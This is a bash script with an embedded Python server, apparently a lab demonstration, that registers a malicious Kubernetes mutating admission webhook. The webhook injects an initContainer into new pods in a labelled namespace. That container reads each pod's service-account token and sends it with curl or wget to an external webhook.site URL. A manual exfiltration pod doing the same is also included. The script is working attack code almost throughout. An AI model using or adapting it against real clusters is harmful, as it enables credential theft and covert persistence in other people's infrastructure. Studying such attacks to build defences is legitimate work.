#!/bin/bash

# Malicious Webhook - Token Exfiltration
# Injects initContainer that exfiltrates tokens to webhook.site

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

WEBHOOK_NS="webhook-attack"
VICTIM_NS="victim-namespace"
EXFIL_URL="<WEBHOOK-URL>"

echo ""
echo -e "${BLUE}=== MALICIOUS WEBHOOK WITH TOKEN EXFILTRATION ===${NC}"
echo ""

# Clean up any existing installation
log_info "Cleaning up old installation..."
kubectl delete mutatingwebhookconfiguration token-exfiltrator 2>/dev/null || true
kubectl delete namespace $WEBHOOK_NS 2>/dev/null || true
kubectl delete namespace $VICTIM_NS 2>/dev/null || true
sleep 5

# Create namespaces
log_info "Creating namespaces..."
kubectl create namespace $WEBHOOK_NS
kubectl create namespace $VICTIM_NS

# Create simple webhook server using Python
log_info "Creating webhook server code..."
cat <<'PYEOF' > /tmp/webhook.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import json
import base64

EXFIL_URL = "<WEBHOOK-URL>"

class WebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/mutate':
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            admission_review = json.loads(body)
            
            pod = admission_review['request']['object']
            pod_name = pod['metadata'].get('name', 'unknown')
            namespace = pod['metadata'].get('namespace', 'default')
            
            print(f"[WEBHOOK] Intercepted: {namespace}/{pod_name}")
            
            # Malicious initContainer with token exfiltration
            backdoor = {
                "name": "exfil",
                "image": "alpine:latest",
                "command": ["/bin/sh", "-c"],
                "args": [f"""
                    apk add --no-cache curl wget > /dev/null 2>&1
                    echo "=== EXFILTRATING TOKEN ==="
                    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO_TOKEN")
                    echo "Token length: ${{#TOKEN}}"
                    curl -X POST "{EXFIL_URL}" \\
                      -H "Content-Type: application/x-www-form-urlencoded" \\
                      -d "pod={namespace}/{pod_name}" \\
                      -d "token=$TOKEN" \\
                      -d "namespace={namespace}" \\
                      --max-time 10 2>&1 || \\
                    wget --post-data="pod={namespace}/{pod_name}&token=$TOKEN&namespace={namespace}" \\
                      "{EXFIL_URL}" -O- 2>&1
                    echo "=== EXFIL COMPLETE ==="
                    sleep 5
                """]
            }
            
            # Create JSON patch
            patch = [{
                "op": "add",
                "path": "/spec/initContainers" if 'initContainers' not in pod['spec'] else "/spec/initContainers/-",
                "value": [backdoor] if 'initContainers' not in pod['spec'] else backdoor
            }]
            
            response = {
                "apiVersion": "admission.k8s.io/v1",
                "kind": "AdmissionReview",
                "response": {
                    "uid": admission_review['request']['uid'],
                    "allowed": True,
                    "patchType": "JSONPatch",
                    "patch": base64.b64encode(json.dumps(patch).encode()).decode()
                }
            }
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            print(f"[WEBHOOK] Injected backdoor into {namespace}/{pod_name}")
        
        elif self.path == '/health':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
    
    def do_GET(self):
        if self.path == '/health':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8443), WebhookHandler)
    server.socket = ssl.wrap_socket(server.socket,
                                    certfile='/certs/tls.crt',
                                    keyfile='/certs/tls.key',
                                    server_side=True)
    print(f"[WEBHOOK] Server starting on port 8443")
    print(f"[WEBHOOK] Exfiltration target: {EXFIL_URL}")
    server.serve_forever()
PYEOF

kubectl create configmap webhook-code --from-file=webhook.py=/tmp/webhook.py -n $WEBHOOK_NS

# Generate certificates
log_info "Generating TLS certificates..."
openssl req -x509 -newkey rsa:2048 -keyout /tmp/tls.key -out /tmp/tls.crt \
    -days 365 -nodes -subj "/CN=webhook-server.${WEBHOOK_NS}.svc" 2>/dev/null

kubectl create secret tls webhook-certs \
    --cert=/tmp/tls.crt \
    --key=/tmp/tls.key \
    -n $WEBHOOK_NS

CA_BUNDLE=$(cat /tmp/tls.crt | base64 | tr -d '\n')

# Deploy webhook server
log_info "Deploying webhook server..."
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: webhook-server
  namespace: $WEBHOOK_NS
spec:
  replicas: 1
  selector:
    matchLabels:
      app: webhook
  template:
    metadata:
      labels:
        app: webhook
    spec:
      containers:
      - name: webhook
        image: python:3.9-alpine
        command: ["python", "/app/webhook.py"]
        ports:
        - containerPort: 8443
        volumeMounts:
        - name: code
          mountPath: /app
        - name: certs
          mountPath: /certs
      volumes:
      - name: code
        configMap:
          name: webhook-code
      - name: certs
        secret:
          secretName: webhook-certs
---
apiVersion: v1
kind: Service
metadata:
  name: webhook-server
  namespace: $WEBHOOK_NS
spec:
  selector:
    app: webhook
  ports:
  - port: 443
    targetPort: 8443
EOF

log_info "Waiting for webhook server..."
sleep 30

kubectl wait --for=condition=Available deployment/webhook-server -n $WEBHOOK_NS --timeout=60s 2>/dev/null || true

# Check if pod is running
POD_STATUS=$(kubectl get pods -n $WEBHOOK_NS -l app=webhook -o jsonpath='{.items[0].status.phase}' 2>/dev/null || echo "Unknown")
if [ "$POD_STATUS" != "Running" ]; then
    log_error "Webhook pod not running. Status: $POD_STATUS"
    log_info "Checking logs..."
    kubectl logs -n $WEBHOOK_NS -l app=webhook --tail=50
    exit 1
fi

log_success "Webhook server running!"

# Register webhook
log_info "Registering MutatingWebhookConfiguration..."
cat <<EOF | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: token-exfiltrator
webhooks:
- name: webhook-server.${WEBHOOK_NS}.svc
  admissionReviewVersions: ["v1"]
  clientConfig:
    service:
      name: webhook-server
      namespace: $WEBHOOK_NS
      path: /mutate
      port: 443
    caBundle: ${CA_BUNDLE}
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  namespaceSelector:
    matchLabels:
      exfil: "enabled"
  sideEffects: None
  failurePolicy: Ignore
  timeoutSeconds: 10
EOF

log_success "Webhook registered!"

# Enable for victim namespace
log_info "Enabling webhook for victim namespace..."
kubectl label namespace $VICTIM_NS exfil=enabled

echo ""
log_success "SETUP COMPLETE!"
echo ""
echo -e "${YELLOW}Exfiltration URL: ${EXFIL_URL}${NC}"
echo ""
echo -e "${BLUE}To test via webhook (automatic injection):${NC}"
echo "  kubectl run test --image=nginx:alpine -n $VICTIM_NS"
echo "  sleep 20"
echo "  kubectl logs test -n $VICTIM_NS -c exfil"
echo ""
echo -e "${BLUE}To test via manual pod (direct exfiltration):${NC}"
echo "  Run the following command:"
echo ""
echo "  cat <<PODEOF | kubectl apply -f -"
echo "apiVersion: v1"
echo "kind: Pod"
echo "metadata:"
echo "  name: manual-exfil-test"
echo "  namespace: $VICTIM_NS"
echo "spec:"
echo "  containers:"
echo "  - name: main"
echo "    image: nginx:alpine"
echo "  initContainers:"
echo "  - name: exfil"
echo "    image: alpine:latest"
echo "    command: [\"/bin/sh\", \"-c\"]"
echo "    args:"
echo "    - |"
echo "      apk add --no-cache curl"
echo "      TOKEN=\\\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
echo "      echo \"Token length: \\\${#TOKEN}\""
echo "      curl -X POST \"$EXFIL_URL\" \\"
echo "        -d \"pod=manual-test\" \\"
echo "        -d \"token=\\\$TOKEN\" \\"
echo "        --max-time 10"
echo "      echo \"Done\""
echo "      sleep 5"
echo "PODEOF"
echo ""
echo -e "${BLUE}Check webhook.site:${NC}"
echo "  $EXFIL_URL"
echo ""

# Optional: Create manual exfil pod automatically
read -p "Create manual exfil pod now? (y/n) " -n 1 -r
echo ""
if [[ $REPLY =~ ^[Yy]$ ]]; then
    log_info "Creating manual exfiltration pod..."
    
    cat <<PODEOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: manual-exfil-test
  namespace: $VICTIM_NS
spec:
  containers:
  - name: main
    image: nginx:alpine
  initContainers:
  - name: exfil
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      apk add --no-cache curl
      TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
      echo "Token length: \${#TOKEN}"
      curl -X POST "$EXFIL_URL" \\
        -d "pod=manual-test" \\
        -d "token=\$TOKEN" \\
        --max-time 10
      echo "Done"
      sleep 5
PODEOF
    
    sleep 20
    log_info "Checking exfil logs..."
    kubectl logs manual-exfil-test -n $VICTIM_NS -c exfil 2>/dev/null || log_warning "Logs not ready yet"
    
    echo ""
    log_success "Manual exfil pod created! Check webhook.site:"
    echo "  $EXFIL_URL"
    echo ""
fi

read -p "Cleanup everything? (y/n) " -n 1 -r
echo ""
if [[ $REPLY =~ ^[Yy]$ ]]; then
    kubectl delete mutatingwebhookconfiguration token-exfiltrator 2>/dev/null || true
    kubectl delete namespace $WEBHOOK_NS $VICTIM_NS 2>/dev/null || true
    rm -f /tmp/webhook.py /tmp/tls.{crt,key}
    log_success "Cleaned up!"
fi